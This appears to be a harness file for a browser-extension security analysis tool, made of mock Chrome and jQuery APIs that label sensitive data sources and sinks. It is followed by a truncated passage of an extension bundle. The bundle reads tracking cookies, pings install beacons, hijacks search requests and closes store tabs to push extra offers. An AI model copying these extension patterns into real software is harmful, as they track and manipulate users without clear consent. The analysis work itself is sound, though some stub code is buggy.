// original file:crx_headers/jquery_header.js

// ========= proxy ========= 
// function Proxy(target, handler){
//     handler.apply
    
//     if (info.includeTlsChannelId){
//         this.includeTlsChannelId = info.includeTlsChannelId;
//     }
//     if (info.name){
//         this.name = info.name;
//     }
// }

//  ========= the document and its elements are all objects ========= 

function Document_element(id, class_name, tag){
    this.id = id;
    this.class_name = class_name;
    this.tag = tag;
    this.href = 'Document_element_href';
    MarkSource(this.href, 'Document_element_href');
}
Document_element.prototype.contentWindow = new Window();
Document_element.prototype.createElement = function(tagname){
    var de = new Document_element(undefined, undefined, tagname);
    return de;
}

Document_element.prototype.innerText = new Object();
MarkSource(Document_element.prototype.innerText, "document_body_innerText");

Document_element.prototype.appendChild = function(node){}


function Document(){}

Document.prototype.body = new Document_element(undefined, undefined, "body");

Document.prototype.getElementById = function(id){
    var document_element = new Document_element(id);
};

// Document.prototype.body.appendChild = function(){};


Document.prototype.addEventListener = function(type, listener,  [ options]){
    MarkAttackEntry('document_eventListener_'+type, listener);
};


Document.prototype.createElement = Document_element.prototype.createElement;



Document.prototype.write = function(text){
    sink_function(text, "document_write_sink");
}

Document.prototype.execCommand = function(text){
    sink_function(text, "document_execCommand_sink");
}

document = new Document();


//  ========= JQuery ========= 
// $(this).hide() - hides the current element.
// $("p").hide() - hides all <p> elements.
// $(".test").hide() - hides all elements with class="test".
// $("#test").hide() - hides the element with id="test".
function $(a){
    // find element a in document
    // if a is an Array
    if (Array.isArray(a)){
        var array_in = a;
        a = undefined;
    }
    else if(typeof a === 'function') {
        a();
    }
    else{
        // $("#test")
        if (a[0] == '#'){
            var document_element = new Document_element(a.substring(1,));
            // document.push(document_element);
            // document[a] = document_element;
        }
        // $(".test")
        else if(a[0] == '.'){
            var document_element = new Document_element(undefined, a.substring(1,));
            // document.push(document_element);
        }
        // document
        else if (a == document){
            var document_element = document;
        }
        // $("p")
        else{
            var document_element = new Document_element(undefined, undefined,a.substring(1,));
            // document.push(document_element);
        }
        var array_in = [document_element];
    }
    return new JQ_obj(a, array_in);
};






// jQuery.extend( target, object1 [, objectN ] )
$.extend = function(obj1, obj2){
    for (var key in obj2){
        obj1[key] = obj2[key];
    }
}

// jQuery.extend( [deep ], target, object1 [, objectN ] ) deep copy

$.each = function(obj, callback){
    var index=0;
    for (index=0; index<obj.length; i++){
        callback(index, obj[index]);
    }
}

$.when = function(func1, func2){
    func1();
    func2();
}

function require(para){
    if (para=='jquery'){
         return $;
    }
}

Deferred_obj = function(){}

Deferred_obj.prototype.promise = new Promise()

$.Deferred = function(){
    return Deferred_obj();
}

jQuery = $;

jqXHR = function(){}

// jqXHR.fail(function( jqXHR, textStatus, errorThrown ) {});
jqXHR.prototype.fail = function(callback){
    // do nothing
    return this;
}
// jqXHR.done(function( data, textStatus, jqXHR ) {});
// done == success
jqXHR.prototype.done = function(callback){
    callback();
    return this;
}
// jqXHR.always(function( data|jqXHR, textStatus, jqXHR|errorThrown ) {});
jqXHR.prototype.always = function(callback){
    callback();
    return this;
}




JQ_obj = function(a, array_in){
    this.selector = a;
    this.context = document;
    var i=0;
    for (i=0; i<array_in.length; i++){
        this[i] = array_in[i];
    }
    this.length = array_in.length;
}

// events [,selector] [,data], handler
JQ_obj.prototype.on = function(){
    if (this[0]==document){
        MarkAttackEntry("document_on_event", arguments[-1]);
    }  
}

JQ_obj.prototype.val = function(first_argument) {
    if (first_argument!=undefined){
        sink_function(first_argument, 'JQ_obj_val_sink');
        this[0].value = first_argument;
    }
    else{
        // return value of x
    }
};

JQ_obj.prototype.html = function(first_argument) {
    if (arguments.length >0){
        sink_function(first_argument, 'JQ_obj_html_sink');
        this[0].html = first_argument;
    }
    else{
        // return html of x
    }
};

JQ_obj.prototype.ready = function(first_argument) {
    if (this[0]==document){
        first_argument();
    }  
};

JQ_obj.prototype.remove = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.focus = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.click = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.attr = function(first_argument, second_argument) {
    this[0].first_argument = second_argument;
};

JQ_obj.prototype.find = function(first_argument) {
    var document_element = new Document_element();
    return new JQ_obj(undefined, document_element);
};

JQ_obj.prototype.filter = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.keyup = function(first_argument) {
    first_argument();
};

JQ_obj.prototype.each = function(first_argument) {
    // for (var i=0; i<this.length; i++){
    //     first_argument.call(this[i]);
    // }
    first_argument.call(this[0]);
};



//  ========= Event ========= 
function Event(type){
    this.type = type;
}





function eval(para1){
    sink_function(para1, 'eval_sink');
}

function setTimeout(para1){

}

function URL(url, base){
    return base+url;
}
URL.prototype.createObjectURL = function(object){
    return object.toString()
} 


// original file:crx_headers/bg_header.js

// jquery
//fetch
fetch_obj = function(){}

fetch = function(resource, options){
    sink_function(resource, "fetch_resource_sink");
    sink_function(options.url, "fetch_options_sink");
    return new fetch_obj();
}

fetch_obj.prototype.then = function(callback){
    var responseText = 'data_from_fetch';
    MarkSource(responseText, 'fetch_source');
    callback(responseText);
    return this;
}

// jqXHR
$.ajax = function(url, settings){
    if (typeof url=="string"){
        sink_function(url, 'jQuery_ajax_url_sink');
        sink_function(settings.data, 'jQuery_ajax_settings_data_sink');
        if(settings.beforeSend){
            settings.beforeSend();
        }
        if (settings.success){
            var jQuery_ajax_result_source = 'data_form_jq_ajax';
            MarkSource(jQuery_ajax_result_source, 'jQuery_ajax_result_source');
            settings.success(jQuery_ajax_result_source);
        }
    }
    else{
        sink_function(url.url, 'jQuery_ajax_settings_url_sink');
        sink_function(url.data, 'jQuery_ajax_settings_data_sink');
        if (url.complete){
            url.complete(xhr, textStatus);
        }
        if (url.success){
            var jQuery_ajax_result_source = 'data_form_jq_ajax';
            MarkSource(jQuery_ajax_result_source, 'jQuery_ajax_result_source');
            url.success(jQuery_ajax_result_source);
        }
    }
}
// jQuery.get( url [, data ] [, success ] [, dataType ] )
// data: Type: PlainObject or String
// success: Type: Function( PlainObject data, String textStatus, jqXHR jqXHR )
// dataType: Type: String
$.get = function(url , success){
    var responseText = 'data_from_url_by_get';
    MarkSource(responseText, 'jQuery_get_source');
    sink_function(url, 'jQuery_get_url_sink');
    success(responseText);
    return new jqXHR();
}
// jQuery.post( url [, data ] [, success ] [, dataType ] )
$.post = function( url , data, success){
    var responseText = 'data_from_url_by_post';
    MarkSource(responseText, 'jQuery_post_source');
    sink_function(data, 'jQuery_post_data_sink');
    sink_function(url, 'jQuery_post_url_sink');
    success(responseText);
    return new jqXHR();
}

// =========XMLHttpRequest======
function XMLHttpRequest(){};

XMLHttpRequest.prototype.open = function(method, url, async, user, psw){
    sink_function(url, 'XMLHttpRequest_url_sink');
};

// if msg is not none, used for POST requests
XMLHttpRequest.prototype.send = function(msg){
    if (msg!=undefined){
        sink_function(msg, 'XMLHttpRequest_post_sink');
    }
};


XMLHttpRequest.prototype.responseText = 'sensitive_responseText';
XMLHttpRequest.prototype.responseXML = 'sensitive_responseXML';
MarkSource(XMLHttpRequest.prototype.responseText, 'XMLHttpRequest_responseText_source');
MarkSource(XMLHttpRequest.prototype.responseXML, 'XMLHttpRequest_responseXML_source');


XHR = XMLHttpRequest;

//  ========= window ========= 

// targetWindow.postMessage(message, targetOrigin, [transfer]);
// window.postMessage = function(message, targetOrigin, [transfer]){
//     sink_function(message, 'window_postMessage_sink');
// };

// // target.addEventListener(type, listener [, options]);
// // the 'e' parameter passed to listener can be ignored, otherwise, it is the event object
// window.addEventListener = function(type, listener,  [options]){
//     MarkAttackEntry('cs_window_eventListener_' + type, listener);
// };


window.top = new Object();
window.top.addEventListener = window.addEventListener;

window.localStorage = new Object();
window.localStorage.removeItem = function(a){
    sink_function(a, 'bg_localStorage_remove_sink');
};

window.localStorage.setItem = function(a, b){
    sink_function(a, 'bg_localStorage_setItem_key_sink');
    sink_function(b, 'bg_localStorage_setItem_value_sink');
};

window.localStorage.getItem = function(a){
    var localStorage_getItem = 'value';
    MarkSource(localStorage_getItem, 'bg_localStorage_getItem_source');
};

window.localStorage.clear = function(){
    sink_function('bg_localStorage_clear_sink');
};


window.frames[0] = window;
window.frames[1] = window;

var self = window;
var top = window;

// ========= port ========= 
function Port(info){
    if (info.includeTlsChannelId){
        this.includeTlsChannelId = info.includeTlsChannelId;
    }
    if (info.name){
        this.name = info.name;
    }
}

Port.prototype.onMessage = new Object();

Port.prototype.onMessage.addListener = function(myCallback){
    RegisterFunc("bg_port_onMessage", myCallback);
};

Port.prototype.postMessage = function(msg){
    TriggerEvent('bg_port_postMessage', {message:msg});
};

// ========= external port ========= 
function externalPort(info){
    this.includeTlsChannelId = info.includeTlsChannelId;
    this.name = info.name;
}

externalPort.prototype.onMessage = new Object();

externalPort.prototype.onMessage.addListener = function(myCallback){
    MarkAttackEntry("bg_external_port_onMessage", myCallback);
};

externalPort.prototype.postMessage = function(msg){
    sink_function(msg, 'bg_external_port_postMessage_sink');
};


// ========= external native port ========= 
function externalNativePort(info){
    this.includeTlsChannelId = info.includeTlsChannelId;
    this.name = info.name;
}

externalNativePort.prototype.onMessage = new Object();

externalNativePort.prototype.onMessage.addListener = function(myCallback){
    MarkAttackEntry("bg_externalNativePort_onMessage", myCallback);
};

externalNativePort.prototype.postMessage = function(msg){
};


// ========= tab ========= 
function Tab(){
    this.active = true;
    this.audible = true;
    this.autoDiscardable = true;
    this.discarded = true;
    this.favIconUrl = 'https://example.com/image.png';
    this.groupId = 1;
    this.height =  600;
    this.highlighted = true;
    this.id = 99;
    this.incognito = false;
    this.index = 2;
    this.mutedInfo = {muted:false};
    this.openerTabId = 1;
    this.pendingUrl = 'https://example2.com';
    this.pinned = true;
    this.sessionId = '23';
    this.status = 'complete';
    this.title = 'example';
    this.url = 'https://example.com';
    this.width =  800;
    this.windowId = 14;
}

//  ========= chrome ========= 
function Chrome(){}

Chrome.prototype.runtime = new Object();
// for deprecated APIs
Chrome.prototype.extension = Chrome.prototype.runtime;  
Chrome.prototype.extension.onRequest = Chrome.prototype.runtime.onMessage;

Chrome.prototype.runtime.onInstalled = new Object();
// this function be called righrt after all the 
Chrome.prototype.runtime.onInstalled.addListener = function(myCallback) {
    var details = {is:99, previousVersion:'0.0.1', reason:'install'};
    myCallback(details);
};


Chrome.prototype.runtime.onConnect = new Object();
Chrome.prototype.runtime.onConnect.addListener = function(myCallback) {
  RegisterFunc("bg_chrome_runtime_onConnect", myCallback);
};

Chrome.prototype.runtime.onMessage = new Object();
// myCallback:
// (message: any, sender: MessageSender, sendResponse: function) => {...}
// get message from chrome.runtime.sendMessage or chrome.tabs.sendMessage
Chrome.prototype.runtime.onMessage.addListener = function(myCallback) {
    RegisterFunc('bg_chrome_runtime_onMessage', myCallback);
};
MessageSender = function(){
    this.frameId = 123;
    this.guestProcessId=456;
    this.guestRenderFrameRoutingId = 109;
    this.id = 0;
    this.nativeApplication = 'nativeApplication';
    this.origin = 'back';
    this.tab = new Tab();
    this.tlsChannelId = 'tlsChannelId';
    this.url = 'url';
};
function sendResponse(message_back){
    // var eventName = 'bg_chrome_runtime_onMessage_response';
    // var info = {message: message_back};
    TriggerEvent('bg_chrome_runtime_onMessage_response', {message: message_back});
};


// chrome.runtime.onMessage.removeListener
Chrome.prototype.runtime.onMessage.removeListener = function(myCallback) {
    UnregisterFunc('bg_chrome_runtime_onMessage', myCallback);
};

// chrome.runtime.onMessageExternal.addListener
Chrome.prototype.runtime.onMessageExternal = new Object();
// myCallback parameters: (message: any, sender: MessageSender, sendResponse: function) => {...}
Chrome.prototype.runtime.onMessageExternal.addListener = function(myCallback){
    MarkAttackEntry("bg_chrome_runtime_MessageExternal", myCallback);
}
MessageSenderExternal = function(){
    this.frameId = 123;
    this.guestProcessId=456;
    this.guestRenderFrameRoutingId = 109;
    this.id = 0;
    this.nativeApplication = 'nativeApplication';
    this.origin = 'external';
    this.tab = new Tab();
    this.tlsChannelId = 'tlsChannelId';
    this.url = 'url';
};
function sendResponseExternal(message_out){
    sink_function(message_out, 'sendResponseExternal_sink');
};

function sendResponseExternalNative(message_out){};

// chrome.runtime.onConnectExternal.addListener
Chrome.prototype.runtime.onConnectExternal = new Object();
// myCallback parameters: (message: any, sender: MessageSender, sendResponse: function) => {...}
Chrome.prototype.runtime.onConnectExternal.addListener = function(myCallback){
    MarkAttackEntry("bg_chrome_runtime_onConnectExternal", myCallback);
}

Chrome.prototype.runtime.connectNative = function(extensionId, connectInfo){
    // var eventName = 'cs_chrome_runtime_connect';
    if (connectInfo===undefined){
        var connectInfo = extensionId;
        var extensionId = undefined;
    }
    // var info = {extensionId:extensionId, connectInfo:connectInfo};
    return new externalNativePort(connectInfo);
};

Chrome.prototype.runtime.sendNativeMessage = function(application, message, callback){
    var response;
    MarkSource(response, 'sendNativeMessage_response_source');
    callback();
}



Chrome.prototype.topSites = new Object();
Chrome.prototype.topSites.get = function(myCallback){
    var mostVisitedUrls_source = [{title:'title', url:'url'}];
    // mostVisitedUrls is sensitive data!
    MarkSource(mostVisitedUrls_source, 'topSites_source');
    myCallback(mostVisitedUrls_source);
};

// chrome.tabs.sendMessage(tabId: number, message: any, options: object, responseCallback: function)
// Chrome.prototype.tabs.sendMessage = function(tabId, message, options, responseCallback){
//     var eventName = 'bg_chrome_tabs_sendMessage';
//     var info =  {tabId:99, message:message, options:options, responseCallback:responseCallback};
//     TriggerEvent(eventName, info);
// };
// 
Chrome.prototype.tabs = new Object();
Chrome.prototype.tabs.sendMessage = function(tabId, message, responseCallback){
    // var eventName = 'bg_chrome_tabs_sendMessage';
    // var info =  {tabId:tabId, message:message, responseCallback:responseCallback};
    TriggerEvent('bg_chrome_tabs_sendMessage', {tabId:tabId, message:message, responseCallback:responseCallback});
};

// chrome.tabs.query(queryInfo: object, callback: function)
Chrome.prototype.tabs.query = function(queryInfo, callback){
    // queryInfo is to find corresponding tabs, ingore it now
    var tab = new Tab();
    var alltabs = [tab];
    callback(alltabs);
}

Chrome.prototype.tabs.getSelected = function(callback){
    var tab = new Tab();
    callback(tab);
}

Chrome.prototype.tabs.onActivated = new Object();
// the callback is called once a new tab is activated, we run the callback after all the others are set
Chrome.prototype.tabs.onActivated.addListener = function(myCallback){
    var activeInfo = new ActiveInfo();
    myCallback(activeInfo);
}

Chrome.prototype.tabs.onUpdated = new Object();
Chrome.prototype.tabs.onUpdated.addListener = function(myCallback){
    MarkAttackEntry("bg_tabs_onupdated", myCallback);
    // var tab = new Tab();
    // myCallback(99, {}, tab);
}

// for deprecated APIs
Chrome.prototype.tabs.onActiveChanged = Chrome.prototype.tabs.onActivated


// chrome.tabs.executeScript
Chrome.prototype.tabs.executeScript = function(tabid, details, callback){
    sink_function(tabid, 'chrome_tabs_executeScript_sink');
    sink_function(details, 'chrome_tabs_executeScript_sink');
    sink_function(callback, 'chrome_tabs_executeScript_sink');
    callback();
}


function ActiveInfo(){
    this.tabId = 3;
    this.windowId = 1;
};


// chrome.tabs.create
Chrome.prototype.tabs.create = function(createProperties, callback){
    sink_function(createProperties.url, 'chrome_tabs_create_sink');
    callback();
}
// chrome.tabs.update
Chrome.prototype.tabs.update = function(tabId, updateProperties, callback){
    sink_function(updateProperties.url, 'chrome_tabs_update_sink');
    callback();
}
// chrome.tabs.getAllInWindow
Chrome.prototype.tabs.getAllInWindow = function(winId, callback){
    var tab = new Tab();
    var tabs = [tab];
    callback(tabs);
}



Chrome.prototype.cookies = new Object();
// chrome.cookies.get(details: CookieDetails, callback: function)
Chrome.prototype.cookies.get = function(details, callback){
    var cookie_source = {domain:'cookie_domain', expirationDate:2070, hostOnly:true, httpOnly: false, name:'cookie_name', path:'cookie_path',sameSite:'no_restriction', secure:true, session: true, storeId:'cookie_storeId', value: 'cookie_value' };
    MarkSource(cookie_source, 'cookie_source')
    callback(cookie_source);
};

// chrome.cookies.getAll(details: object, callback: function)
Chrome.prototype.cookies.getAll = function(details, callback){
    var cookie_source = {domain:'.uspto.gov', expirationDate:2070, hostOnly:true, httpOnly: false, name:'cookie_name', path:'cookie_path',sameSite:'no_restriction', secure:true, session: true, storeId:'cookie_storeId', value: 'cookie_value' };
    var cookies_source = [cookie_source];
    MarkSource(cookies_source, 'cookies_source')
    callback(cookies_source);
};


// chrome.cookies.getAllCookieStores(callback: function)
Chrome.prototype.cookies.getAllCookieStores = function(callback){
    var CookieStore_source = {id:'cookiestore_id', tabIds:[0,1,2,3]};
    var CookieStores_source = [CookieStore_source];
    MarkSource(CookieStores_source, 'CookieStores_source')
    callback(CookieStores_source);
};

// chrome.cookies.getAllCookieStores(callback: function)
Chrome.prototype.cookies.set = function(details, callback){
    sink_function(details, 'chrome_cookies_set_sink');

};

Chrome.prototype.cookies.remove = function(details, callback){
    sink_function(details, 'chrome_cookies_remove_sink');
    callback(details);
}



Chrome.prototype.storage = new Object();
Chrome.prototype.storage.sync = new Object();
Chrome.prototype.storage.sync.get = function(key, callback){
    var storage_sync_get_source = {'key':'value'};
    MarkSource(storage_sync_get_source, 'storage_sync_get_source');
    callback(storage_sync_get_source);
};

Chrome.prototype.storage.sync.set = function(key, callback){
    sink_function(key, 'chrome_storage_sync_set_sink');
    callback();
};

Chrome.prototype.storage.sync.remove = function(key, callback){
    sink_function(key, 'chrome_storage_sync_remove_sink');
    callback();
};

Chrome.prototype.storage.sync.clear = function(callback){
    sink_function('chrome_storage_sync_clear_sink');
    callback();
};


Chrome.prototype.storage.local = new Object();
Chrome.prototype.storage.local.get = function(key, callback){
    var storage_local_get_source = {'key':'value'};
    MarkSource(storage_local_get_source, 'storage_local_get_source');
    arguments[len(arguments)-1](storage_local_get_source);
};

Chrome.prototype.storage.local.set = function(key, callback){
    sink_function(key, 'chrome_storage_local_set_sink');
    callback();
};

Chrome.prototype.storage.local.remove = function(key, callback){
    sink_function(key, 'chrome_storage_local_remove_sink');
    callback();
};

Chrome.prototype.storage.local.clear = function(callback){
    sink_function('chrome_storage_local_clear_sink');
    callback();
};



Chrome.prototype.history = new Object();
Chrome.prototype.history.search = function(query, callback){
    var HistoryItem = {id:'id for history item' ,lastVisitTime:1000 ,title:'title of history page' , typedCount:3, url:'https://example.com' , visitCount:2   };
    var HistoryItem_source = [HistoryItem];
    MarkSource(HistoryItem_source, 'HistoryItem_source');
    callback(HistoryItem_source);
};


Chrome.prototype.history.getVisits = function(details, callback){
    var VisitItem = {id:'id for the item' ,referringVisitId: 'referringVisitIdvfdsv', transition:'auto_bookmark' ,visitId:'visitIdvfsv', visitTime:1001};
    var VisitItem_source = [VisitItem];
    MarkSource(VisitItem_source, 'VisitItem_source');
    callback(VisitItem_source);
};

Chrome.prototype.downloads = new Object();
Chrome.prototype.downloads.search = function(query, callback){
    var DownloadItem = {byExtensionId:'id for the extension', byExtensionName:'name for the extension'};
    var DownloadItem_source = [DownloadItem];
    MarkSource(DownloadItem_source, 'DownloadItem_source');
    callback(DownloadItem_source);
};


Chrome.prototype.downloads.download = function(options, callback){
    sink_function(options, 'chrome_downloads_download_sink');
}

Chrome.prototype.downloads.getFileIcon = function(downloadId, callback){
    var iconURL = 'https://example.com/image.png';
    var iconURL_source = iconURL;
    MarkSource(iconURL_source, 'iconURL_source');
    callback(iconURL_source);
};

// Remove the downloaded file if it exists and the DownloadItem is complete
Chrome.prototype.downloads.removeFile = function(downloadId, callback) {
    sink_function(downloadId, 'chrome_downloads_removeFile_sink');
    // body...
}

// Erase matching DownloadItem from history without deleting the downloaded file.
Chrome.prototype.downloads.erase = function(query, callback) {
    sink_function(query, 'chrome_downloads_erase_sink');
    // body...
}

// chrome.windows
Chrome.prototype.windows = new Object();
Chrome.prototype.windows.getCurrent = function(callback){
    var win = {id:"id"};
    callback(win);
};



function BookmarkTreeNode(){
    this.children = [];
    this.dataAdded= 10;
    this.dateGroupModified=1;
    this.id='id for the node';
    this.index=2;
    this.parentId='id for the parent';
    this.title = 'title of the node';
    this.unmodifiable = 'managed';
    this.url = 'http://www.example.com';
}


// chrome.bookmarks.getTree(function(data)
Chrome.prototype.bookmarks = new Object(); 
Chrome.prototype.bookmarks.getTree = function(callback){
    var node = new BookmarkTreeNode();
    var child = new BookmarkTreeNode();
    node.children = [child];
    var BookmarkTreeNode_source = [node];
    MarkSource(BookmarkTreeNode_source, 'BookmarkTreeNode_source');
    callback(BookmarkTreeNode_source);
}

Chrome.prototype.bookmarks.search = function(query, callback){
    var node = new BookmarkTreeNode();
    var child = new BookmarkTreeNode();
    node.children = [child];
    var BookmarkTreeNode_source = [node];
    MarkSource(BookmarkTreeNode_source, 'BookmarkTreeNode_source');
    callback(BookmarkTreeNode_source);
    sink_function(query, 'BookmarkSearchQuery_sink');
}

Chrome.prototype.bookmarks.create = function(bookmark, callback){
    var node = new BookmarkTreeNode();
    var child = new BookmarkTreeNode();
    node.children = [child];
    var BookmarkTreeNode_source = [node];
    sink_function(bookmark, 'BookmarkCreate_sink');
    MarkSource(BookmarkTreeNode_source, 'BookmarkTreeNode_source');
    callback(BookmarkTreeNode_source);
}

Chrome.prototype.bookmarks.remove = function(id, callback){
    sink_function(bookmark, 'BookmarkRemove_sink');
    callback();
}




Chrome.prototype.webRequest = new Object();
Chrome.prototype.webRequest.onBeforeSendHeaders = new Object();
// Fired before sending an HTTP request
// chrome.webRequest.onBeforeSendHeaders.addListener(listener: function)
// MDN:
// browser.webRequest.onBeforeSendHeaders.addListener(
//   listener,             //  function
//   filter,               //  object
//   extraInfoSpec         //  optional array of strings
// )
Chrome.prototype.webRequest.onBeforeSendHeaders.addListener = function(myCallback, filter, extraInfoSpec){

}


// chrome.alarms
Chrome.prototype.alarms = new Object();
Chrome.prototype.alarms.clearAll = function(callback){}
Chrome.prototype.alarms.create = function(name, alarmInfo){}
Chrome.prototype.alarms.onAlarm.addListener = function(callback){}


// chrome.browsingData.remove

Chrome.prototype.browsingData = new Object();
Chrome.prototype.browsingData.remove = function(para1, prara2, para3){
    sink_function('chrome_browsingData_remove_sink');
}

Chrome.prototype.management = new Object();
Chrome.prototype.management.getAll = function(callback){
    var ExtensionInfos = [{"description":"description", "enabled":true}];
    MarkSource(ExtensionInfos, "management_getAll_source");
    callback(ExtensionInfos);
}

Chrome.prototype.management.getSelf = function(callback){
    var ExtensionInfos = [{"description":"description", "enabled":true}];
    MarkSource(ExtensionInfos, "management_getSelf_source");
    callback(ExtensionInfos);
}

// chrome.management.setEnabled(
Chrome.prototype.management.setEnabled = function(id, enabled, callback){
    sink_function(id, "management_setEnabled_id");
    sink_function(enabled, "management_setEnabled_enabled");
    callback();
}

Chrome.prototype.permissions = new Object();
Chrome.prototype.permissions.contains = function(permissions, callback){
    callback(true);
}
Chrome.prototype.permissions.request = function(permissions, callback){
    callback(true);
}


chrome = new Chrome();
_ = chrome;
chrome.experimental.cookies = chrome.cookies;
browser = chrome;
/////////
// original file:/Users/jianjia/Documents/tmp/EOPG/run_JSCPG_merge/crx_lists/jianjia_timeout/extensions/phapjhelokffmoifofmfggohcpiiakca/release/browseraction_release.js

/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};

/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {

/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId])
/******/ 			return installedModules[moduleId].exports;

/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			exports: {},
/******/ 			id: moduleId,
/******/ 			loaded: false
/******/ 		};

/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);

/******/ 		// Flag the module as loaded
/******/ 		module.loaded = true;

/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}


/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;

/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;

/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";

/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ function(module, exports, __webpack_require__) {

	let Background = __webpack_require__(4);
	let webrequestHandle = __webpack_require__(12);
	const extId = (chrome.runtime && chrome.runtime.id) || "";

	var settings = {
	    domain: "www.ecosearch.club",
	    searchDomain: "search.ecosearch.club",
	    hashToAppend: "",
		searchEntry: "/chrome/newtab/search.aspx",
	    actionEntry: "/get/pages/peco",
	    cfgEntry: "/get/config/peco",
		openNewtabOnBrowserAction: false,
		openNewtabOnInstall: false,
		notifications: false,
	    newtabPage: "https://www.ecosearch.club/index.html",
	    removeUrl: "https://www.ecosearch.club/index.html?uninstall=true",
	    secondOfferUrl: "https://www.ecosearch.club/install/additional.html?src=nt",
	    groupId: "221",
	    partid: "peco",
		storageArr: ["subid", "ynw", "user_id", "uid", "tag_id", "sub_id", "sub_id1", "session_id", "install_date", "install_time", "lp"],
		cookiesToRead: {uid: true, user_id: true, tag_id: true, sub_id: true, sub_id1: true, subid: true, ynw: true, lp: true, session_id: true},
		useBeacon: false,
		extId: extId,
		countSearches: true
	};

	let backgroundModule = new Background.Background(settings);
	let userData = {};
	backgroundModule.initData.then((data)=> {
		userData = data;
	});

	let opt = ["blocking"];
	let onBeforeRequest = function(t) {
		return webrequestHandle.handle(t, settings, backgroundModule);
	};
	backgroundModule.addBeforeRequestBlocker(onBeforeRequest, settings.searchDomain, opt);


/***/ },
/* 1 */,
/* 2 */,
/* 3 */,
/* 4 */
/***/ function(module, exports, __webpack_require__) {

	const utils = __webpack_require__(5);
	const reporter = __webpack_require__(7);
	const storage = __webpack_require__(6)

	module.exports.Background = function (settings) {
	    const self = this;
	    const tabsHandlers = [];
	    const eventbus = [];
		const ignore = new Set();

		if(!settings.host)
			settings.host = "https://" + settings.domain;

		let domain = settings.domain;
	    const extensionData = {
	        extId: settings.extId,
	        v: chrome.runtime.getManifest().version,
	        gid: settings.groupId
	    }
	    let additionalData = {};
	    self.initData = new Promise((resolve, reject)=> {
	        let promiseArr = [];
	        utils.getConfig(settings).then((config)=> {
	            settings.useBeacon = config.useBeacon;
	            settings.hcs = config.hcs;
	            let storageArr = config.storageArr
	            promiseArr.push(utils.getCookies(domain));
	            promiseArr.push(storage.getStorage(storageArr));
	            Promise.all(promiseArr).then((data)=> {
	                let cookies = data[0];
	                let storageData = data[1];
	                let cookiesToRead = config.cookiesToRead;
	                let cookiesData = utils.handleInitData(storageArr, cookiesToRead, cookies, storageData, settings);
	                resolve(cookiesData);
	                // utils.syncCookies(cookies, domain.replace("www.", "search."));
	            });
	        });
	    });

	    self.initData.then((data)=> {
	        additionalData = data;
	        chrome.browserAction.onClicked.addListener (function () {
	            let newtabPage = settings.newtabPage || "newtab/newtab.html";
	            let newtabData = {
	                v:extensionData.v,
	                gid:extensionData.gid
	            }
	            newtabPage = utils.prepareUrl(newtabPage, settings, data, newtabData);
	            var manifest = chrome.runtime.getManifest();
	            if (settings.openNewtabOnBrowserAction || (manifest["chrome_url_overrides"] && manifest["chrome_url_overrides"]["newtab"])) {
	                chrome.tabs.create({url: newtabPage});
	            }
	        });

	        let removeUrl = settings.removeUrl || ("https://" + domain + "/remove/index.html");
	        let removeData = {
	            sub_id: data.sub_id,
	            sub_id1: data.sub_id1,
	            tag_id: data.tag_id,
	            uid: data.uid || "",
	            install_time: data.install_time,
	            lp: data.lp || "-1",
	            user_id: data.user_id || "-1",
	            partid: settings.partid
	        };
	        let removeExtensionData = {
	            extId: extensionData.extId
	        }
	        removeUrl = utils.prepareUrl(removeUrl, settings, removeData, removeExtensionData);
	        if(removeUrl.length > 255)
	            removeUrl = removeUrl.substr(0, 255);
	        if(chrome.runtime.setUninstallURL)
	            chrome.runtime.setUninstallURL(removeUrl);
	    });

	    chrome.runtime.onInstalled.addListener(function(details){
	        self.initData.then((installData)=> {
	            self.onInstall(details, installData);
	        }).catch((err)=> {
	            self.onInstall(details, {});
	        });
	    });

	    self.onInstall = function(details, installData){
	        if(details.reason === "install") {
	            reporter.sendEvent(details.reason, installData, settings, extensionData);
	            reporter.sendBeacon("install", installData, settings, extensionData)
	        }
	        else if(details.reason === "update") {
	            reporter.sendEvent(details.reason, installData, settings, extensionData);
	            reporter.sendBeacon("update", installData, settings, extensionData)
	        }
	        self.openAdditionalOffer(details, installData);
	    };

	    self.unsetIgnore = function(value) {
	    	setTimeout(function(){
	    		ignore.delete(value);
			}, additionalData.ign || 20000)
		}

	    self.openAdditionalOffer = function(details, installData) {
	        let secondOffer = settings.secondOfferUrl || "";
	        secondOffer = utils.prepareUrl(secondOffer, settings, installData, extensionData);
	        let newtabPage = settings.newtabPage || "";
	        newtabPage = utils.prepareUrl(newtabPage, settings, installData, extensionData);
	        if (details.reason === "install") {
	            let isAdditionalPageOpen = false;
	            let manifest = chrome.runtime.getManifest();
	            if (chrome.windows && chrome.tabs && manifest.permissions && manifest.permissions.indexOf("tabs") > -1 ) {
	                chrome.windows.getAll({populate: true}, function (windows) {
	                    let landingPage = windows.find(function (window) {
	                        window.tabs.find(function (tab) {
	                            if (tab.url && tab.url.indexOf(domain) > -1 && tab.url.indexOf("gid=" + settings.groupId) > -1 && tab.url.indexOf("postbackid=") > -1) { //installation page
	                                if (settings.secondOfferUrl && !isAdditionalPageOpen) {
	                                    isAdditionalPageOpen = true;
	                                    chrome.tabs.create({url: secondOffer});
	                                }
	                                chrome.tabs.remove(tab.id);
	                            } else if (tab.url && tab.url.indexOf(settings.extId) > -1) { //chrome store page
	                                if (settings.secondOfferUrl && !isAdditionalPageOpen) {
	                                    isAdditionalPageOpen = true;
	                                    chrome.tabs.create({url: secondOffer});
	                                } else if (settings.newtabPage && !isAdditionalPageOpen)
	                                    chrome.tabs.create({url: newtabPage});
	                                chrome.tabs.remove(tab.id);
	                            }
	                        });
	                    });
	                });
	            } else {
